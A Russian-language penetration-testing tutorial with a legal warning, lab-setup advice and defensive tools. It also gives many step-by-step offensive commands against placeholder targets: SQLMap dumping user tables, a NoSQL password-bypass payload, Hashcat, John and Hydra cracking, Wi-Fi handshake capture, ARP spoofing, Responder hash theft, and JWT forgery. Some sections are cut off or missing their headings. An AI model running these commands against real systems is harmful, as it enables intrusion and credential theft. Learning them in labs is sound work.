Где скачивать софт, как строить лабораторию и меры безопасности

ПРАВОВОЕ ПРЕДУПРЕЖДЕНИЕ (УК РК Статья 205 / УК РФ Статья 272): Неправомерный доступ к компьютерной информации, сканирование портов или отправка эксплойтов на чужие ресурсы без разрешения влечет уголовную ответственность. Тренироваться можно только в собственной виртуальной лаборатории или на легальных полигонах.

Золотые правила безопасности исследователя (Lab OPSEC):

  • Полная изоляция на виртуальной машине: Никогда не запускайте эксплойты и сомнительные утилиты на основной ОС. Разверните Kali Linux или Parrot OS внутри гипервизора.
  • Сетевой режим Host-Only / Nat Network: При тренировке на локальных уязвимых машинах изолируйте их от внешней сети.
  • Снимки состояния (Snapshots): Делайте снапшот перед любым тестом для отката за 3 секунды.

Инструменты виртуализации и развертывания полигонов (Полный гайд)

  • 1. Oracle VirtualBox — бесплатный гипервизор для запуска изолированных виртуальных машин (Kali Linux, Windows, Metasploitable).
    — Как пользоваться: Скачайте установщик с virtualbox.org и готовый образ Kali Linux (формат .vbox) с kali.org/get-kali.
    — Откройте VirtualBox -> нажмите Machine -> Add и выберите скачанный файл.
    — В настройках сети (Settings -> Network) выберите NAT Network для безопасной связки атакующей и учебной машин. Управление из терминала: VBoxManage list vms и создание снимка: VBoxManage snapshot "Kali" take "Clean_State".
  • 2. OpenVPN — клиент для безопасного подключения к закрытым учебным сетям полигонов TryHackMe и HackTheBox.
    — Установка: sudo apt install openvpn.
    — Как пользоваться: Скачайте личный конфигурационный файл .ovpn из профиля на сайте TryHackMe или HackTheBox и запустите туннель в терминале:
    sudo openvpn --config your_profile.ovpn
    — Убедитесь, что появился виртуальный сетевой интерфейс tun0 с вашим лабораторным IP-адресом: ip a show tun0.

Голосовые и видео дипфейки (Deepfakes)

Технологии клонирования голоса (Zero-Shot Voice Cloning) и замены лиц в реальном времени (Real-Time Face Swap) активно применяются в телефонном мошенничестве (Vishing) и атаках на компании. Нейросетям типа RVC или XTTS достаточно 3–5 секунд записи голоса, чтобы синтезировать речь с тембром жертвы.

Живые провокационные тесты во время видеозвонка:

  • Тест перекрытия (Occlusion Test): Попросите собеседника провести ладонью с растопыренными пальцами перед лицом — нейросеть даст артефакты на границах пальцев.
  • Тест профиля (90 градусов): При резком повороте головы строго в профиль маска дипфейка теряет привязку к ключевым точкам лица.

Утилиты для технической экспертизы медиафайлов (Полный гайд)

  • 1. Audacity — профессиональный аудиоредактор для выявления синтезированного голоса по спектрограмме.
    — Установка: sudo apt install audacity или с сайта audacityteam.org.
    — Как пользоваться: Перетащите подозрительное голосовое сообщение (.ogg, .mp3, .wav) в окно программы. Нажмите на название дорожки слева и переключите вид с Waveform на Spectrogram (Спектрограмма).
    — Если выше отметки 8 kHz или 11 kHz видна идеально ровная черная горизонтальная полоса («отрезанные» высокие частоты), а в паузах между словами нет естественного вдоха — аудио сгенерировано TTS-нейросетью.
  • 2. FFprobe (из пакета FFmpeg) & ExifTool — консольные анализаторы потоков, кодеков и скрытых метаданных видео.
    — Установка: sudo apt install ffmpeg libimage-exiftool-perl.
    — Как пользоваться: Выполните exiftool video.mp4 и ffprobe -v quiet -print_format json -show_format -show_streams video.mp4.
    — Настоящее видео со смартфона содержит теги камеры (Make, Model, Android/iOS version). Дипфейк-видео после рендера в DeepFaceLab или Wav2Lip всегда имеет в поле Writing application библиотеку Lavf (FFmpeg) и неестественное расхождение битрейта аудио и видеодорожки.

Усовершенствованный фишинг и AitM-атаки

Современный фишинг использует обратные прокси-серверы в реальном времени (AitM — Adversary-in-the-Middle), которые пропускают через себя ввод пароля и 2FA-кода жертвы, перехватывая готовую сессионную куку (Session Cookie), а также технику Browser-in-the-Browser (BitB) — отрисовку фальшивого окна авторизации прямо внутри страницы на HTML/CSS.

Инструменты анализа ссылок и симуляции фишинга (Полный гайд)

  • 1. Gophish — профессиональный Open-Source фреймворк для проведения учебных фишинговых рассылок и проверки осведомленности сотрудников (Security Awareness).
    — Как пользоваться: Скачайте релиз с getgophish.com, запустите бинарный файл ./gophish и откройте панель администратора по адресу https://127.0.0.1:3333.
    — В разделе Sending Profiles настройте тестовый SMTP-сервер, в Landing Pages импортируйте учебную страницу, а в Campaigns запустите тест и отслеживайте статистику переходов.
  • 2. cURL + Whois + Dig — связка консольных утилит для безопасного расследования подозрительной ссылки без открытия браузера.
    — Как пользоваться: Чтобы раскрыть цепочку скрытых редиректов сокращенной ссылки и увидеть финальный домен, выполните:
    curl -ILs -A "Mozilla/5.0" "https://suspicious-link.com" | grep -iE "HTTP/|Location:|Server:"
    — Проверьте дату регистрации домена (фишинговые домены живут несколько дней):
    whois suspicious-domain.com | grep -iE "Creation Date|Registrar"
    — Проверьте наличие защитных почтовых записей SPF и DMARC у домена отправителя письма:
    dig TXT +short _dmarc.domain.com

Архитектура защиты, Hardening и криптогигиена

Защита строится по модели Defense in Depth (Эшелонированная оборона) и Zero Trust (Нулевое доверие): аппаратные ключи аутентификации FIDO2/Passkeys, полное шифрование дисков, изолированные менеджеры паролей и строгая фильтрация входящих сетевых соединений.

Инструменты криптозащиты и укрепления ОС (Полный гайд)

  • 1. VeraCrypt — стандарт криптографического шифрования дисков, флешек и создания скрытых контейнеров (алгоритмы AES-256, Serpent, Twofish).
    — Установка: Скачайте с официального сайта veracrypt.fr или sudo apt install veracrypt.
    — Как пользоваться: Нажмите Create Volume -> Create an encrypted file container. Выберите алгоритм AES, задайте размер файла (например, 2 ГБ) и сложный мастер-пароль, поводите мышкой в окне для генерации случайной энтропии ключей и нажмите Format. Чтобы подключить контейнер как виртуальный диск, выберите файл, слот (например, диск Z:) и нажмите Mount.
  • 2. UFW (Uncomplicated Firewall) & Fail2Ban — связка межсетевого экрана и системы автоматической блокировки перебора паролей на Linux-сервере.
    — Установка: sudo apt install ufw fail2ban.
    — Как пользоваться UFW: Заблокируйте все входящие подключения по умолчанию и разрешите только нужные порты:
    sudo ufw default deny incoming && sudo ufw default allow outgoing
    sudo ufw allow 22/tcp && sudo ufw enable && sudo ufw status verbose
    — Как пользоваться Fail2Ban: Скопируйте конфиг sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local, включите секцию [sshd] с параметрами maxretry = 3 и bantime = 1h, запустите sudo systemctl restart fail2ban. Проверить забаненные IP атакующих: sudo fail2ban-client status sshd.
  • 3. KeePassXC — полностью локальный Open-Source менеджер паролей с базой данных .kdbx, зашифрованной алгоритмом Argon2id.
    — Гайд: Установите с keepassxc.org, создайте базу с мастер-паролем и ключевым файлом (Key File) на отдельной флешке. Используйте встроенный генератор паролей (длина от 20 символов).

Глубокий анализ сетевого трафика (Wireshark и TShark)

Перевод сетевой карты в неразборчивый режим (Promiscuous Mode) позволяет перехватывать и разбирать каждый сетевой кадр по уровням модели OSI — от MAC-адресов Ethernet до прикладных данных HTTP, DNS и TLS.

[Frame (Физика)] ──► [Ethernet (MAC)] ──► [IPv4 (IP-адреса)] ──► [TCP/UDP (Порты)] ──► [HTTP/DNS/TLS (Данные)]

Инструменты перехвата и анализа пакетов (Полный гайд)

  • 1. Wireshark (Графический анализатор) — главный инструмент для форензики дампов трафика (файлы .pcap / .pcapng).
    — Как пользоваться: Запустите Wireshark, выберите активный интерфейс (например, eth0 или wlan0) и используйте строку Display Filter:
    • Найти переданные в открытом виде формы и пароли: http.request.method == "POST" || ftp.request.command == "PASS"
    • Выявить SYN-сканирование портов: tcp.flags.syn == 1 and tcp.flags.ack == 0
    • Увидеть домены в зашифрованном HTTPS-трафике (по заголовку SNI): tls.handshake.extensions_server_name
    • Собрать пакеты в читаемый диалог: Правый клик по пакету -> Follow -> TCP Stream. Выгрузить переданные файлы: File -> Export Objects -> HTTP.
  • 2. TShark & tcpdump (Консольные анализаторы) — незаменимы при работе по SSH на серверах без графического интерфейса и для быстрого парсинга больших дампов.
    — Захват трафика в файл через tcpdump: sudo tcpdump -i eth0 -nn -s0 -w dump.pcap port 80 or port 53
    — Извлечение всех User-Agent и URI из дампа через TShark одной командой:
    tshark -r dump.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri

Активная сетевая разведка и сканирование портов (Nmap)

На каждом сервере доступно 65 535 портов TCP и UDP. Сетевые сканеры отправляют пакеты и по флагам ответа (SYN-ACK, RST, ICMP Unreachable) определяют открытые порты, версии служб и операционную систему.

Инструменты сканирования сети и портов (Полный гайд)

  • 1. Nmap (Network Mapper) — классический сканер с мощным скриптовым движком NSE (Nmap Scripting Engine).
    — Пошаговый гайд по командам:
    • Обнаружение живых хостов в подсети без сканирования портов: nmap -sn 192.168.1.0/24
    • Быстрый скрытый SYN-скан всех 65535 портов: sudo nmap -sS -p- --min-rate 2000 10.10.10.5
    • Глубокое определение версий сервисов, ОС и базовых скриптов на найденных портах: sudo nmap -sC -sV -O -p 22,80,443 10.10.10.5 -oN scan_report.txt
    • Автоматическая проверка служб на известные уязвимости CVE: nmap -sV --script=vuln 10.10.10.5
  • 2. RustScan & Masscan — сверхскоростные асинхронные сканеры портов, способные проверить все 65 535 портов за 3–5 секунд и сразу передать найденные порты в Nmap.
    — Как пользоваться RustScan: rustscan -a 10.10.10.5 --ulimit 5000 -- -sC -sV (сначала RustScan за пару секунд находит открытые порты, а после -- автоматически запускает детальный Nmap только по ним).
    — Как пользоваться Masscan: sudo masscan -p1-65535 10.10.10.0/24 --rate=10000 -oG masscan.txt.

Анализ и перехват веб-приложений (Burp Suite & OWASP ZAP)

Любые проверки на стороне браузера (HTML/JS) легко обходятся, если перехватить HTTP-запрос по пути на сервер. Перехватывающий прокси позволяет менять параметры цены, ID пользователей (уязвимость IDOR), заголовки авторизации и куки на лету.

Инструменты перехвата и модификации веб-запросов (Полный гайд)

    — Полный гайд по работе:
    1. Запустите Burp Suite -> перейдите во вкладку Proxy -> Intercept и нажмите Open Browser (откроется встроенный Chromium, уже настроенный на прокси 127.0.0.1:8080).
    2. Во вкладке Proxy -> HTTP history найдите интересующий запрос (например, POST /api/cart/checkout) и нажмите Ctrl+R, чтобы отправить его в модуль Repeater.
    3. В Repeater меняйте значения параметров (например, user_id=102 на user_id=101 для проверки IDOR), нажимайте Send и анализируйте ответ сервера справа.
    4. Для автоматического перебора параметров отправьте запрос в Intruder (Ctrl+I), выделите параметр знаками §значение§ и загрузите словарь во вкладке Payloads.
  • 2. OWASP ZAP (Zed Attack Proxy) — полностью бесплатный Open-Source прокси-комбайн без искусственных ограничений скорости фаззера.

SQL-инъекции (SQLi): теория, ручная эксплуатация и автоматизация

Уязвимость SQL Injection возникает, когда пользовательский ввод подставляется напрямую в строку SQL-запроса без использования параметризованных выражений (Prepared Statements). Это позволяет изменить логику запроса, прочитать чужие таблицы или даже выполнить команды на сервере.

Утилиты для поиска и эксплуатации SQL и NoSQL инъекций (Полный гайд)

  • 1. SQLMap — легендарный автоматизированный инструмент для обнаружения и раскрутки всех видов SQL-инъекций (Boolean-based, Time-based, Error-based, UNION).
    — Пошаговый гайд от разведки до дампа базы:
    • Шаг 1 (Список всех баз данных): sqlmap -u "http://site.local/item.php?id=1" --batch --dbs
    • Шаг 2 (Список таблиц в выбранной БД): sqlmap -u "http://site.local/item.php?id=1" --batch -D shop_db --tables
    • Шаг 3 (Выгрузка колонок и паролей из таблицы): sqlmap -u "http://site.local/item.php?id=1" --batch -D shop_db -T users --dump
    • Совет профи: Если уязвимость находится внутри сложного POST-запроса с куками, сохраните запрос из Burp Suite в текстовый файл req.txt и запустите: sqlmap -r req.txt --level=3 --risk=2 --batch --dbs.
  • 2. Ghauri & NoSQLMap — современные альтернативы для обхода WAF и тестирования NoSQL баз данных (MongoDB, CouchDB).
    — Как пользоваться Ghauri (быстрый аналог SQLMap): ghauri -u "http://site.local/item.php?id=1" --dbs --batch
    — Проверка MongoDB на NoSQL-инъекцию вручную (в JSON теле запроса): Замените {"username": "admin", "password": "123"} на оператор сравнения {"username": "admin", "password": {"$ne": null}} — условие станет истинным без знания пароля.

Межсайтовый скриптинг (XSS): векторы, контексты и защита

XSS (Cross-Site Scripting) позволяет внедрить произвольный JavaScript-код в страницу, которую просматривают другие пользователи. Выделяют три типа: Stored XSS (хранимая в БД), Reflected XSS (отраженная через URL-параметр) и DOM-based XSS (выполняемая на клиенте из-за небезопасного использования innerHTML или eval).

Инструменты автоматизированного поиска XSS (Полный гайд)

  • 1. Dalfox (Finder of XSS) — сверхбыстрый сканер XSS-уязвимостей на языке Go, анализирующий DOM-дерево и точки отражения параметров.
    — Установка: go install github.com/hahwul/dalfox/v2@latest или sudo apt install dalfox.
    — Как пользоваться:
    • Проверка одного URL с параметрами: dalfox url "http://site.local/search?q=test&lang=ru"
    • Массовая проверка списка URL из файла: dalfox file urls.txt -o found_xss.txt
    • Проверка с подстановкой своей сессионной куки: dalfox url "http://site.local/profile?name=1" -C "session=xyz123"
  • 2. XSStrike — интеллектуальный сканер на Python, который не просто перебирает шаблоны, а анализирует контекст верстки (внутри тега, атрибута или скрипта) и генерирует полиглоты для обхода WAF.
    — Установка: git clone https://github.com/s0md3v/XSStrike && cd XSStrike && pip install -r requirements.txt
    — Как пользоваться:
    • Сканирование GET-параметров с обходом фильтров: python3 xsstrike.py -u "http://site.local/page.php?id=1"
    • Автоматический краулинг всего сайта на глубину 3 уровня в поисках XSS: python3 xsstrike.py -u "http://site.local" --crawl -l 3

Пассивная разведка и сбор данных (OSINT)

Криптография паролей, Hashcat, John the Ripper и Hydra

Пароли хранятся в виде необратимых хеш-сумм. Быстрые алгоритмы без соли (MD5, SHA-1, NTLM) перебираются на видеокартах со скоростью десятки миллиардов вариантов в секунду, тогда как специализированные алгоритмы (Argon2id, bcrypt) защищают базу за счет высокой вычислительной сложности.

Инструменты офлайн и онлайн аудита паролей (Полный гайд)

  • 1. Hashcat — самый быстрый в мире восстановитель паролей на базе видеокарт (GPU OpenCL/CUDA).
    — Пошаговый гайд:
    • Узнать код алгоритма (например, -m 0 для MD5, -m 1000 для Windows NTLM, -m 3200 для bcrypt): hashcat --help | grep -i ntlm
    • Словарная атака (-a 0) со словарем rockyou.txt и правилами мутации (добавление цифр и заглавных букв):
    hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    • Атака по маске (-a 3), например, если известно, что пароль состоит из 8 цифр:
    hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d
    • Показать уже расшифрованные пароли из кэша: hashcat -m 0 hashes.txt --show
  • 2. John the Ripper (Jumbo) — универсальный пакет аудита хешей, включающий десятки утилит *2john для извлечения хешей из закрытых архивов ZIP/RAR, документов PDF и SSH-ключей.
    — Как взломать забытый пароль от ZIP-архива или SSH-ключа:
    zip2john secret.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
    ssh2john id_rsa > ssh.hash && john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
  • 3. THC-Hydra — утилита для сетевого (онлайн) подбора паролей к протоколам SSH, FTP, RDP, SMB и веб-формам.
    — Проверка SSH на учебном стенде: hydra -l admin -P passwords.txt ssh://10.10.10.5 -t 4

Аудит безопасности беспроводных сетей (Wi-Fi)

В сетях WPA2-PSK при подключении клиента передается 4-стороннее рукопожатие (4-Way Handshake) или идентификатор роуминга PMKID. Перехватив эти пакеты в режиме мониторинга, можно проверить стойкость пароля собственной точки доступа.

Утилиты для аудита радиоэфира Wi-Fi (Полный гайд)

  • 1. Пакет Aircrack-ng (airmon-ng, airodump-ng, aireplay-ng) — классический набор для тестирования беспроводных сетей.
    — Полный цикл команд:
    1. Остановить мешающие сетевые службы и включить режим мониторинга (Monitor Mode):
    sudo airmon-ng check kill && sudo airmon-ng start wlan0
    2. Просканировать эфир и узнать MAC-адрес (BSSID) и канал (CH) своего роутера:
    sudo airodump-ng wlan0mon
    3. Запустить запись пакетов конкретного роутера на его канале (например, канал 6):
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
    4. Проверить перехваченный файл handshake-01.cap по словарю:
    aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
  • 2. Hcxtools (hcxdumptool & hcxpcapngtool) — современный инструмент для перехвата хеша PMKID напрямую от роутера (даже если к сети не подключен ни один клиент) с последующей конвертацией для скоростного перебора в Hashcat.
    — Как пользоваться:
    • Захват пакетов от точки доступа: sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon --enable_status=15
    • Конвертация дампа в формат Hashcat (мод 22000): hcxpcapngtool -o wifi_hash.hc22000 dump.pcapng
    • Запуск перебора на видеокарте: hashcat -m 22000 wifi_hash.hc22000 rockyou.txt

Сетевые атаки в локальной сети (MITM, ARP-Spoofing, Responder)

Внутри локальной подсети устройства находят друг друга по физическим MAC-адресам через протокол ARP и широковещательные запросы LLMNR / mDNS. Поскольку в этих протоколах нет криптографической проверки подлинности, узел в той же сети может перехватить трафик или сетевые хеши аутентификации.

[Устройство жертвы] ──(Трафик)──► [Узел анализа (ARP-Spoof)] ──(Пересылка)──► [Шлюз 192.168.1.1]

Инструменты аудита локальных сетей (Полный гайд)

  • 1. Bettercap — современный швейцарский нож для анализа локальных сетей (ARP-spoofing, DNS-spoofing, сниффинг пакетов и аудит BLE/Wi-Fi).
    — Установка: sudo apt install bettercap.
    — Как пользоваться на лабораторном стенде:
    1. Запустите интерактивную консоль: sudo bettercap -iface eth0
    2. Включите обнаружение всех устройств в локальной сети: net.probe on и посмотрите таблицу: net.show
    3. Задайте целевую виртуальную машину и запустите перехват:
    set arp.spoof.fullduplex true -> set arp.spoof.targets 192.168.1.15 -> arp.spoof on -> net.sniff on.
  • 2. Responder — специализированный инструмент для проверки корпоративных сетей на уязвимость к отравлению широковещательных протоколов LLMNR, NBT-NS и mDNS.
    — Установка: sudo apt install responder.
    — Как пользоваться:
    • Сначала запустите в пассивном режиме анализа (без вмешательства в сеть), чтобы увидеть широковещательные запросы: sudo responder -I eth0 -A
    • В активном лабораторном режиме (sudo responder -I eth0 -wFv) при обращении тестовой машины к несуществующей сетевой папке Responder перехватывает хеш NTLMv2 и сохраняет его в папку /usr/share/responder/logs/ для последующего аудита в Hashcat (мод -m 5600).

Веб-фаззинг и поиск скрытых директорий (Gobuster & ffuf)

На большинстве сайтов самые интересные разделы — панели администратора (/admin), забытые архивы исходного кода (/backup.zip), конфигурационные файлы (/.env, /.git/config) и тестовые API-эндпоинты — нигде не опубликованы в меню. Веб-фаззинг (Fuzzing) — это скоростная автоматическая подстановка тысяч слов из словарей (например, пакета SecLists) в URL, заголовки или параметры запроса с фильтрацией ответов сервера по HTTP-коду (200 OK, 301, 403) и размеру страницы.

[Словарь SecLists] ──► [Фаззер ffuf / Gobuster (FUZZ)] ──► [Фильтр HTTP 200 / 301 / 403] ──► [Найдена скрытая панель /admin]

Главные инструменты веб-фаззинга (Полный гайд)

    — Установка: sudo apt install ffuf seclists
    — Полный гайд по основным сценариям:
    • Поиск скрытых папок и файлов (с расширениями .php, .bak, .txt):
    ffuf -u http://site.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.bak,.txt -mc 200,301,403
    • Поиск скрытых виртуальных хостов (поддоменов на одном IP) через заголовок Host с фильтрацией стандартного размера ответа (-fs 4242):
    ffuf -u http://site.local/ -H "Host: FUZZ.site.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242
    • Фаззинг неизвестных GET-параметров страницы:
    ffuf -u "http://site.local/profile.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 120
  • 2. Gobuster — надежный многопоточный сканер директорий, DNS-поддоменов и S3-бакетов.
    — Установка: sudo apt install gobuster
    — Как пользоваться:
    • Режим перебора директорий (dir) в 50 потоков:

[Пользователь домена] ──► [Сбор графа BloodHound / Kerberoasting] ──► [Анализ прав ACL] ──► [Domain Admin (Контроллер домена)]

Безопасность контейнеров Docker и побег из контейнера (Container Escape)

Контейнеры Docker изолируют процессы с помощью пространств имен ядра Linux (Namespaces) и ограничений ресурсов (cgroups), но делят одно общее ядро ОС с хост-машиной. Если контейнер запущен с опасным флагом --privileged, или внутрь него проброшен управляющий сокет /var/run/docker.sock, злоумышленник может совершить побег из контейнера (Container Escape) и получить права root на основном физическом сервере.

[Внутри контейнера] ──► [Доступ к /var/run/docker.sock или --privileged] ──► [Монтирование диска хоста /dev/sda1] ──► [Root на хосте]

Инструменты аудита безопасности Docker (Полный гайд)

  • 1. Trivy (от Aqua Security) — всесторонний сканер образов контейнеров, файловых систем и конфигураций Kubernetes на известные CVE-уязвимости и случайно забытые секреты.
    — Установка: sudo apt install trivy (или через оф. репозиторий Aqua Security).
    — Как пользоваться:
    • Проверить Docker-образ перед запуском на критические и высокие уязвимости:
    trivy image --severity HIGH,CRITICAL nginx:1.18
    • Просканировать папку своего проекта (включая Dockerfile и зависимости Python/Node.js) на забытые ключи и ошибки конфигурации:
    trivy fs --scanners vuln,secret,misconfig ./my_project/
  • 2. Deepce (Docker Enumeration, Escalation of Privileges and Container Escape) — специализированный скрипт для проверки окружения внутри контейнера и поиска путей побега на хост.
    — Как пользоваться:
    • Скачайте скрипт с github.com/stealthcopter/deepce внутрь тестируемого контейнера и запустите:
    chmod +x deepce.sh && ./deepce.sh
    • Скрипт автоматически проверит: находитесь ли вы в контейнере, доступен ли сокет docker.sock, включен ли режим --privileged и какие опасные Linux Capabilities (например, CAP_SYS_ADMIN) выданы процессу.

Пентест REST/GraphQL API и безопасность JWT-токенов

Современные веб- и мобильные приложения общаются с бэкендом через REST API или GraphQL, используя для авторизации JWT (JSON Web Token). JWT состоит из трех частей в кодировке Base64Url, разделенных точками: Header.Payload.Signature. Типичные уязвимости API (по списку OWASP API Security Top 10) включают: BOLA/IDOR (доступ к чужим объектам), Mass Assignment (передача лишних полей вроде "role":"admin" при регистрации) и ошибки проверки подписи JWT (прием алгоритма "alg": "none" или слабый секретный ключ HMAC-SHA256).

[JWT: Header (Алгоритм)] . [Payload (user_id, role)] . [Signature (Криптоподпись сервера)]

Инструменты тестирования API и аудита JWT (Полный гайд)

  • 1. jwt_tool — главный консольный набор для декодирования, модификации, проверки уязвимостей и брутфорса секретных ключей JWT-токенов.
    — Установка: git clone https://github.com/ticarpi/jwt_tool && pip install -r jwt_tool/requirements.txt
    — Пошаговый гайд:
    • Расшифровать и изучить все поля токена: python3 jwt_tool.py <ВАШ_JWT_ТОКЕН>
    • Проверить токен на обход подписи через уязвимость alg: none: python3 jwt_tool.py <JWT> -X a
    • Подобрать слабый секретный ключ подписи HS256 по словарю:
    python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
    • Подделать полезную нагрузку (например, сменить роль на admin) и подписать найденным ключом:
